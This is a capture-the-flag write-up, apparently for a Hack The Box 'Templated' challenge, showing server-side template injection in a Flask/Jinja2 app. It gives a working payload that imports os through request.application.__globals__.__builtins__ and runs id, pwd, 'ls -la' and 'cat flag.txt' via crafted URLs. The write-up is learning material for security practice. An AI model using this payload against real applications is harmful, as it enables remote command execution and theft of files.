# 159.65.89.165:31913

# Site

![templated-htb](https://user-images.githubusercontent.com/98345027/189034879-9c7bc294-cc9d-4f03-9e8d-5f48d66c813c.png)

#### Inspecting the page

![network-htb-templated](https://user-images.githubusercontent.com/98345027/189035349-a9d520a0-1454-414c-bcd0-34ec23959481.png)

### Findings
```javascript
Werkzeug/1.0.1 Python/3.9.0
```

`` A quick google search about "Wekzeug 1.0.1" leads to this`` ![page](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug) `` where we get to know about  RCE`` 

```python
If we type http:url:port/console , notice that the webpage reflect the keyword what ever we search for. This relates to common vulnerability on jinja2 that is SSTI. This ia good Reference https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/

```
![templated-console-htb](https://user-images.githubusercontent.com/98345027/189036753-247e914c-e9d5-4c1f-b288-1104d514fca5.png)

`` To Confirm it we try random text``

![templated-htb-random-try](https://user-images.githubusercontent.com/98345027/189037944-2479600b-262a-4b96-98ee-37facd67ea4e.png)

### SSTI

```javascript
Since we know that the server is running on flask which is a Python Library, Which we can make use of Method Resolution Order (MRO) to traverse up the request library in Flask to import os library as shown in the Reference
```
```javascript
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

#### Exploit Testing

```javascript
1.First we check for id command
```
![exploit-templated-htb](https://user-images.githubusercontent.com/98345027/189039146-a4fad9ad-54ac-46ac-ab3d-8a34ece121a6.png)

```javascript
1. Checking for current directory 
http://159.65.89.165:31913/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('pwd').read()%7D%7D
```

```javascript
2.Listing All the files
http://159.65.89.165:31913/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('ls%20-la').read()%7D%7D
```
![flag-txt-htb-templated](https://user-images.githubusercontent.com/98345027/189039935-c83cb091-0db8-4d43-a00a-a5a15e2bac4f.png)

```
Once we confirmed that in the current directory there is flag we can run a command to print the flag on the screen itself
http://159.65.89.165:31913/%7B%7Brequest.application.__globals__.__builtins__.__import__('os').popen('cat%20flag.txt').read()%7D%7D
```

![actual-flag-htb-templated](https://user-images.githubusercontent.com/98345027/189040390-fb0340e5-287c-4971-9f6c-c323494b0e1c.png)




### REFERENCE
[BLOG]( https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)
### NOTE
```javascript
TECH-STACK: Python,Flask,jinja2
VULNERABILITY: SSTI
```

